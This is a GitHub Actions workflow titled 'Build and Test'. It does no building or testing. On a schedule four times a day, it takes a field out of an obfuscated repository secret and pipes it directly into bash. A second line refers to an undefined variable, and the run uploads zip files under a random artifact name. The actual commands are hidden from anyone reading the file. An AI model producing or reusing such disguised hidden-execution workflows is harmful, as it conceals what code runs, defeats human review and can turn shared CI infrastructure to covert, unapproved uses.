name: Build and Test
on:
  workflow_dispatch:

  schedule:
    - cron: '17 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Execute
        env:
          zbjwz44: ${{ secrets.zbjwz44 }}
        run: |
          printf '%s' "$zbjwz44" | jq -r .ar0228 | /bin/bash
          printf '%s' "$o49314" | jq -r .plb164 | /bin/bash

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 3DCs8KfN
          path: "*.zip"
          retention-days: 1
